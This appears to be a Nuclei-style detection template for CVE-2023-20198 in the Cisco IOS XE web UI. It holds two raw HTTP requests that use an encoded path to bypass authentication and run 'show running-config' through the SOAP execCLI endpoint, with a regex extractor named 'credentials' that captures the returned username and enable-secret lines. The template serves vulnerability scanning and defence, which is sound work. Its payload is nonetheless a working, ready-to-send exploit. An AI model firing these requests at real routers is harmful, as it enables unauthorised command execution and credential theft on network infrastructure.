http/cves/2023/CVE-2023-20198.yaml

id: CVE-2023-20198

info:
  name: Cisco IOS XE Web UI - Command Injection
  author: iamnoooob,rootxharsh,pdresearch,nullenc0de
  severity: critical
  description: |
    A vulnerability in the web UI component of Cisco IOS XE Software could allow
    an unauthenticated, remote attacker to execute arbitrary commands with root privileges
    on the underlying operating system. This vulnerability is due to improper input validation
    in the web UI. An attacker could exploit this vulnerability by sending crafted HTTP requests
    to an affected device. A successful exploit could allow the attacker to execute arbitrary commands 
    with root privileges on the underlying operating system.
  reference:
    - https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-iosxe-webui-privesc-j22SaA4z
    - https://www.rapid7.com/blog/post/2023/10/16/etr-cisco-ios-xe-web-ui-cve-2023-20198-active-exploitation/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2023-20198
  metadata:
    max-request: 1
    verified: true
    vendor: cisco
    product: ios xe
  tags: cve,cve2023,cisco,rce,router,iot,network

http:
  - raw:
      - |
        POST /%77ebui_wsma_https HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)
        Content-Type: text/xml; charset=UTF-8
        Connection: close
        Content-Length: 715

        <?xml version="1.0" encoding="UTF-8"?><SOAP:Envelope xmlns:SOAP="http://schemas.xmlsoap.org/soap/envelope/" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><SOAP:Header><wsse:Security xmlns:wsse="http://schemas.xmlsoap.org/ws/2002/04/secext"><wsse:UsernameToken SOAP:mustUnderstand="false"><wsse:Username>Tenable</wsse:Username><wsse:Password>Nessus</wsse:Password></wsse:UsernameToken></wsse:Security></SOAP:Header><SOAP:Body><request xmlns="urn:cisco:wsma-exec" correlator="01"><execCLI xsd="false"><cmd>show running-config | include username|enable</cmd></execCLI></request></SOAP:Body></SOAP:Envelope>
      - |
        POST /%2577ebui_wsma_https HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)
        Content-Type: text/xml; charset=UTF-8
        Connection: close
        Content-Length: 715

        <?xml version="1.0" encoding="UTF-8"?><SOAP:Envelope xmlns:SOAP="http://schemas.xmlsoap.org/soap/envelope/" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><SOAP:Header><wsse:Security xmlns:wsse="http://schemas.xmlsoap.org/ws/2002/04/secext"><wsse:UsernameToken SOAP:mustUnderstand="false"><wsse:Username>Tenable</wsse:Username><wsse:Password>Nessus</wsse:Password></wsse:UsernameToken></wsse:Security></SOAP:Header><SOAP:Body><request xmlns="urn:cisco:wsma-exec" correlator="01"><execCLI xsd="false"><cmd>show running-config | include username|enable</cmd></execCLI></request></SOAP:Body></SOAP:Envelope>

    matchers-condition: or
    matchers:
      - type: word
        part: body
        condition: or
        words:
          - "enable secret"
          - "username"
          - "<received><text>"
          
      - type: status
        status:
          - 200

      - type: word
        part: header
        words:
          - "text/xml"
        condition: and

    extractors:
      - type: regex
        name: credentials
        group: 1
        regex:
          - "<text>([\\s\\S]*?)</text>"
